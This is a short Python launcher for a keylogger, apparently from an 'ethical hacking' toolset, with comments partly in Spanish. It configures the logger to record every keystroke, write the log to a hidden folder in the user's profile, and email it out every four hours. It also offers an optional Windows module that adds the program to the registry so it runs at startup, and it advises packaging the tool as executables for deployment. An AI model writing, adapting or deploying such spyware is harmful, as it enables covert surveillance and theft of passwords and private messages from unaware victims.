import keylogger

# OR if you are packaging on Windows and want to add to registry
# So that the program runs on startup, uncomment the following import and comment the top one

#import keylogger_persistance_windows

'''
Description: This tool is part of the Ethical Hacking toolset. This is for educational use ONLY for security purposes.
The keylogger takes the all key strikes on keyboard and send them to an email every specific period of time
Requirements: You need only to install pynput
          		'pip install pynput'
          		Use packaged executables for Mac OS, Linux and MS Windows for deployment
Usage: python keylogger.py  or better for deployment to chnage source code and package the app as executables
Enjoy!
'''

# --- CONFIGURACION ---
# Intervalo para guardar en archivo local (en segundos)
SAVE_INTERVAL = 120

# Email y password (opcional - dejar None para solo guardar local)
#EMAIL = None
#PASSWORD = None
EMAIL = "example@hotmail.com"
PASSWORD = "password123"

# Intervalo para enviar por correo (en segundos, 14400 = 4 horas)
EMAIL_INTERVAL = 14400

# Logs se guardan en %USERPROFILE%\FileSystem\keylog.txt (carpeta oculta)

# Main program
my_keylogger = keylogger.Keylogger(
	time_interval=SAVE_INTERVAL,
	email=EMAIL,
	password=PASSWORD,
	email_interval=EMAIL_INTERVAL
)
my_keylogger.start()
